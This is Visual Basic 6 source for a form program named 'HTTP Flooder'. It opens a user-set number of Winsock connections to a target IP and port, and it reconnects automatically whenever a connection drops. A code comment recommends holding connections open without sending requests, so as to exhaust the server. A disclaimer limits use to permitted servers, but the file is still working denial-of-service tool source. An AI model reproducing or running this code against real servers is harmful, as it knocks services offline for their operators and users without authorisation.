VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "HTTP Flooder"
   ClientHeight    =   7605
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   4755
   LinkTopic       =   "Form1"
   ScaleHeight     =   7605
   ScaleWidth      =   4755
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox TxtPort 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   2160
      TabIndex        =   5
      Text            =   "80"
      Top             =   480
      Width           =   495
   End
   Begin VB.TextBox Txtlog 
      Appearance      =   0  'Flat
      Height          =   6135
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   4
      Top             =   1440
      Width           =   4575
   End
   Begin VB.TextBox TxtLive 
      Appearance      =   0  'Flat
      Enabled         =   0   'False
      Height          =   285
      Left            =   3960
      TabIndex        =   3
      Text            =   "0"
      Top             =   480
      Width           =   735
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   0
      Top             =   840
   End
   Begin VB.TextBox TxtConnections 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   3000
      TabIndex        =   2
      Text            =   "100"
      Top             =   480
      Width           =   495
   End
   Begin VB.CommandButton CmdStart 
      Caption         =   "Start"
      Height          =   495
      Left            =   1680
      TabIndex        =   1
      Top             =   840
      Width           =   1215
   End
   Begin VB.TextBox TxtIP 
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   0
      TabIndex        =   0
      Text            =   "127.0.0.1"
      Top             =   480
      Width           =   1815
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Index           =   0
      Left            =   2280
      Top             =   1800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label5 
      Caption         =   "Details"
      Height          =   255
      Left            =   240
      TabIndex        =   10
      Top             =   1080
      Width           =   1095
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      Caption         =   "Active"
      Height          =   255
      Left            =   3960
      TabIndex        =   9
      Top             =   120
      Width           =   855
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      Caption         =   "Connections"
      Height          =   255
      Left            =   2760
      TabIndex        =   8
      Top             =   120
      Width           =   975
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Caption         =   "Port"
      Height          =   255
      Left            =   2160
      TabIndex        =   7
      Top             =   120
      Width           =   375
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Caption         =   "IP To Flood"
      Height          =   255
      Left            =   0
      TabIndex        =   6
      Top             =   120
      Width           =   1695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'I DO NOT RECOMEND THAT YOU USE THIS PROGRAM EXCEPT ON SERVERS WHERE YOU HAVE PERMISSION TO USE IT
'USING DoS PROGRAMS IS CONSIDERED LAME, I ONLY WROTE THIS AS AN EXAMPLE ON HOW VUNRABLE MANY SERVERS ARE.




Private Sub CmdStart_Click()

For intI = 1 To Val(Me.TxtConnections)
   
    
      
      Load Me.Winsock1(intI)
      
      Me.Winsock1(intI).Connect Me.TxtIP, TxtPort.Text
   

   Next intI

End Sub

Private Sub Timer1_Timer()


TxtLive.Text = Winsock1.Count - 1


End Sub

Private Sub Winsock1_Close(Index As Integer)

Txtlog.Text = Txtlog.Text & vbNewLine & "Winsock Lost"

Winsock1(Index).Close
Winsock1(Index).Connect TxtIP.Text, TxtPort.Text

TxtLive.Text = TxtLive.Text - 1



End Sub

Private Sub Winsock1_Connect(Index As Integer)

Dim data1 As String
TxtLive.Text = Winsock1.Count


data1 = "GET / HTTP/1.0" & vbNewLine & vbNewLine 'works better if you don't actualy request, but just hog the server with connections
'Winsock1(Index).SendData data1

'Timer1.Enabled = True


End Sub


Private Sub Winsock1_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim Recived As String
Winsock1(Index).GetData Recived
Txtlog.Text = Txtlog.Text & Recived

End Sub
